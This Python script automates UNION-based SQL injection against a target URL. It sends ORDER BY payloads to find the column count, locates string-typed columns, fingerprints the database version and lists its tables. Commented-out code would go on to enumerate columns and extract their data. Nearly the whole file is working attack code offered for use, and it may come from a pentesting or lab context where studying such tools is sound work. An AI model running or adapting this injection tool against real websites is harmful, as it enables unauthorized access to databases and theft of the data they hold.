import requests
import re
import UnionScripts


# Our main work depend on fn called UnionExploitation :
# his work can divided into TWO Main steps

# 1st Step "Discovery Step":
# a- it determined the number of columns by using 'ORDER BY' Clause
# b- after this we will try to find column(s) that has 'string' as data type to extract data by it.
# we are doing step(b) by calling function called -->figure_sting_columns<--

# 2nd Step "Access Step" :
# a- we want to know the tables in this DB we perform that by calling -->figure_tables_in_DB<--
# b- the user will select the table(s) what he wanted to know its column(s)
# we are doing step(b) by calling -->figure_columns_in_table<--
# c- NOW "ACTUAL" access step by figure out data in the selecting column(s) by user
# we are doing step(c) by calling -->figure_data_in_columns<--


#         <-- MAIN FUNCTION -->
def UnionExploitation(url, error_massage):
    output_exploition = []
    tables = []
    # this is (a-1) step it determined the number of columns using 'ORDER BY' Clause
    print("[*] Figure out number of columns ...")
    output_exploition.append(f"[*] Figure out number of columns ...")
    columns_no = 0
    for i in range(1, 100):
        sql_inj = "'+order+by+{}--+-".format(i)
        inj_url = url + sql_inj
        response = requests.get(inj_url)
        error_pattern = re.compile(error_massage)
        if error_pattern.search(response.text):
            columns_no = i - 1
            break
        i += 1

    # if we can find the number of columns we will go to (b-1) step
    # Trying to find the column(s) that has(have) string as its datatype
    # this step considered as FUNDAMENTAL Step if we can find at least one column
    # with string as datatype, we can extract data from tables easily
    if columns_no:
        print("[+] we have {} columns".format(columns_no))
        output_exploition.append(f"[+] we have {columns_no} columns")
        string_column, sql_payload = UnionScripts.figure_sting_columns(url, columns_no)
        if string_column:
            print("[+] column {} it's data type is string, verify by payload: {}".format(string_column, sql_payload))
            output_exploition.append(f"[+] column {string_column} it's data type is string, verify by payload: {sql_payload}")
            # figure out DB version
            DB_version, isOracle = UnionScripts.figure_DB_version(url, sql_payload)
            if DB_version is not None:
                print("[+] your DB version : {} ".format(DB_version.group(0)))
                output_exploition.append(f"[+] your DB version : {DB_version.group(0)}")
            else:
                print("[-] Can't detect DB version")
                output_exploition.append(f"[-] Can't detect DB version")

            # now we started the funny part of this process by starting enumerate data in DB
            # now at (a-2) step we will enumerate tables that exist in this DB

            # Tables start here
            DB_tables = UnionScripts.figure_tables_in_DB(url, sql_payload, isOracle)
            no_tables = len(DB_tables)
            print("[+] Exploiting {} tables".format(
                no_tables))

            output_exploition.append(
                f"[+] Exploiting {no_tables} tables")
            tables += DB_tables

            for i in DB_tables:
                print("#{}: {}".format(list(DB_tables).index(i), i))

            ## attack Tables start from here
            # table_name = input("Insert table name: ")
            # if table_name not in DB_tables:
            #     print("[X] This table is not exist!")

            # now at step (b-2) and we have the name of table that the user want to enumerate its columns
            #     DB_columns = UnionScripts.figure_columns_in_table(url, sql_payload, table_name, isOracle)
            #     print("[+] Exploiting {} columns, this is names of this columns, insert one to show his data".format(
            #         len(DB_columns)))
            #     for i in DB_columns:
            #         print("#{}: {}".format(list(DB_columns).index(i), i))
            #     column_name = input("Insert column: ")
            #     if column_name not in DB_columns:
            #         print("[X] This table is not exist!")
            #     else:
            #         flag = input(" to insert another column 1 or 0 to exit: ")
            #         while flag == '1':
            #             column = input("insert another column: ")
            #             if column not in DB_columns:
            #                 print("[X] This table is not exist!")
            #             column_name = column_name + '|| \' @ \' ||' + column
            #             flag = input("to insert another column 1 or 0 to exit: ")
            #
            #         # FINALLY, at last step (c-2) step in this step all data within selected tables and columns
            #         # we displayed on user's screen
            #         UnionScripts.figure_data_in_columns(url, sql_payload, table_name, column_name)
        else:
            print("[-] There is no exist columns has string as data type")
    else:
        print("[-] Can't find columns number")
        output_exploition.append("[-] Can't find columns number")
    return output_exploition, tables, sql_payload, isOracle
